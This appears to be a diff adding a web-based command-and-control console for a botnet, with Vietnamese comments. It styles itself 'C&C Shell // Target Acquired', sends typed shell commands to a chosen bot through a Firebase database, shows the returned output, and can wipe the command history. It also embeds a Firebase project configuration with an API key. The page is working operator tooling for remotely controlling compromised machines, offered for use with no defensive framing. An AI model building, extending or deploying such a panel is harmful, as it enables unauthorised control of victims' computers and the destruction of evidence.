@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>C&C Shell // Target Acquired</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=VT323&display=swap');
+
+        body {
+            background-color: #0a0a0a;
+            color: #d4d4d4;
+            font-family: 'VT323', monospace;
+            font-size: 1.2rem;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            max-width: 900px;
+            margin: auto;
+        }
+        #bot-title {
+            color: #00ff41;
+            text-shadow: 0 0 5px #00ff41;
+        }
+        #terminal {
+            background-color: rgba(0, 0, 0, 0.8);
+            border: 1px solid #00ff41;
+            box-shadow: 0 0 15px rgba(0, 255, 65, 0.5) inset;
+            padding: 15px;
+            height: 500px;
+            overflow-y: scroll;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            font-size: 1.1rem;
+        }
+        /* Custom scrollbar for terminal */
+        #terminal::-webkit-scrollbar {
+            width: 10px;
+        }
+        #terminal::-webkit-scrollbar-track {
+            background: #111;
+        }
+        #terminal::-webkit-scrollbar-thumb {
+            background: #00ff41;
+            box-shadow: 0 0 5px #00ff41;
+        }
+        .input-area {
+            display: flex;
+            margin-top: 10px;
+            border: 1px solid #00ff41;
+        }
+        #command-input {
+            flex-grow: 1;
+            background-color: transparent;
+            color: #d4d4d4;
+            border: none;
+            padding: 10px;
+            font-family: 'VT323', monospace;
+            font-size: 1.2rem;
+        }
+        #command-input:focus {
+            outline: none;
+        }
+        #send-button {
+            background-color: #00ff41;
+            color: #0a0a0a;
+            border: none;
+            padding: 10px 15px;
+            cursor: pointer;
+            font-family: 'VT323', monospace;
+            font-size: 1.2rem;
+            text-transform: uppercase;
+        }
+        #send-button:hover {
+            background-color: #55ff88;
+        }
+        .command-echo {
+            color: #00aaff; /* Light blue for user commands */
+        }
+        .command-output {
+            color: #aaffaa; /* Light green for command output */
+        }
+        a {
+            color: #00ff41;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+        .actions {
+            margin-top: 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        #clear-button {
+            background-color: #c0392b;
+            color: #ecf0f1;
+            border: 1px solid #e74c3c;
+            padding: 5px 10px;
+            cursor: pointer;
+            font-family: 'VT323', monospace;
+            font-size: 1rem;
+            text-transform: uppercase;
+            box-shadow: 0 0 5px #c0392b;
+        }
+        #clear-button:hover {
+            background-color: #e74c3c;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2 id="bot-title">ESTABLISHING SHELL...</h2>
+        <div id="terminal"></div>
+        <div class="input-area">
+            <span style="padding: 10px; color: #00ff41;">$&gt;</span>
+            <input type="text" id="command-input" placeholder="Enter command..." autocomplete="off">
+            <button id="send-button">Execute</button>
+        </div>
+        <div class="actions">
+            <a href="index.html">&lt;&lt; Back to Target List</a>
+            <button id="clear-button">Clear History</button>
+        </div>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-app.js";
+        import { getDatabase, ref, onChildAdded, push, remove } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-database.js";
+
+        const firebaseConfig = {
+          apiKey: "AIzaSyDmzm6X2MFSmEHc-trurDHlFMk71t47qqk",
+          authDomain: "chat-4e280.firebaseapp.com",
+          databaseURL: "https://chat-4e280-default-rtdb.firebaseio.com/",
+          projectId: "chat-4e280",
+          storageBucket: "chat-4e280.appspot.com",
+          messagingSenderId: "264573039049",
+          appId: "1:264573039049:web:d7cf8d4e61e822d2f6b818",
+          measurementId: "G-BGY9LNDF1K"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const database = getDatabase(app);
+
+        const urlParams = new URLSearchParams(window.location.search);
+        const botId = urlParams.get('bot_id');
+        const terminal = document.getElementById('terminal');
+        // Tách riêng 2 Set để theo dõi ID của lệnh và kết quả, đây là phần sửa lỗi
+        const displayedCommands = new Set();
+        const displayedResults = new Set();
+
+        if (!botId) {
+            terminal.textContent = "ERROR: TARGET ID NOT SPECIFIED. ABORTING.";
+        } else {
+            document.getElementById('bot-title').textContent = `SHELL ACQUIRED // TARGET: ${botId}`;
+            
+            const commandsRef = ref(database, `bots/${botId}/commands`);
+            const resultsRef = ref(database, `bots/${botId}/results`);
+
+            const commandInput = document.getElementById('command-input');
+            const sendButton = document.getElementById('send-button');
+
+            const sendCommand = () => {
+                const commandText = commandInput.value.trim();
+                if (commandText) {
+                    push(commandsRef, {
+                        command: commandText,
+                        timestamp: Date.now()
+                    });
+                    commandInput.value = '';
+                }
+            };
+
+            sendButton.addEventListener('click', sendCommand);
+            commandInput.addEventListener('keypress', (e) => {
+                if (e.key === 'Enter') {
+                    sendCommand();
+                }
+            });
+
+            // Lắng nghe lệnh mới và hiển thị
+            onChildAdded(commandsRef, (snapshot) => {
+                const commandId = snapshot.key;
+                // Chỉ hiển thị nếu ID lệnh này chưa được hiển thị
+                if (!displayedCommands.has(commandId)) {
+                    const commandData = snapshot.val();
+                    const commandEcho = document.createElement('div');
+                    commandEcho.className = 'command-echo';
+                    commandEcho.textContent = `> ${commandData.command}`;
+                    terminal.appendChild(commandEcho);
+                    terminal.scrollTop = terminal.scrollHeight;
+                    // Đánh dấu ID lệnh này đã được hiển thị
+                    displayedCommands.add(commandId);
+                }
+            });
+
+            // Lắng nghe kết quả mới và hiển thị (ĐÃ SỬA)
+            onChildAdded(resultsRef, (snapshot) => {
+                const resultId = snapshot.key;
+                // Chỉ hiển thị nếu ID kết quả này chưa được hiển thị
+                if (!displayedResults.has(resultId)) {
+                    const resultData = snapshot.val();
+                    const outputDiv = document.createElement('div');
+                    outputDiv.className = 'command-output';
+                    // Xử lý trường hợp output rỗng hoặc không tồn tại
+                    outputDiv.textContent = resultData.output || '[No output]';
+                    terminal.appendChild(outputDiv);
+                    terminal.scrollTop = terminal.scrollHeight;
+                    // Đánh dấu ID kết quả này đã được hiển thị
+                    displayedResults.add(resultId);
+                }
+            });
+
+            // --- PHẦN MÃ MỚI: THÊM NÚT XÓA LỊCH SỬ ---
+            const clearButton = document.getElementById('clear-button');
+            const clearHistory = () => {
+                if (confirm('Bạn có chắc muốn xóa TOÀN BỘ lịch sử lệnh cho mục tiêu này không?\nHành động này không thể hoàn tác.')) {
+                    // Xóa trên Firebase
+                    remove(commandsRef);
+                    remove(resultsRef);
+
+                    // Xóa hiển thị trên màn hình
+                    terminal.innerHTML = '';
+                    displayedCommands.clear();
+                    displayedResults.clear();
+                    
+                    // Thêm một thông báo xác nhận vào terminal
+                    const confirmationMsg = document.createElement('div');
+                    confirmationMsg.className = 'command-output'; // Use same style as output
+                    confirmationMsg.textContent = 'Lịch sử trên Firebase và màn hình đã được xóa.';
+                    terminal.appendChild(confirmationMsg);
+                }
+            };
+            clearButton.addEventListener('click', clearHistory);
+        }
+    </script>
+</body>
+</html>
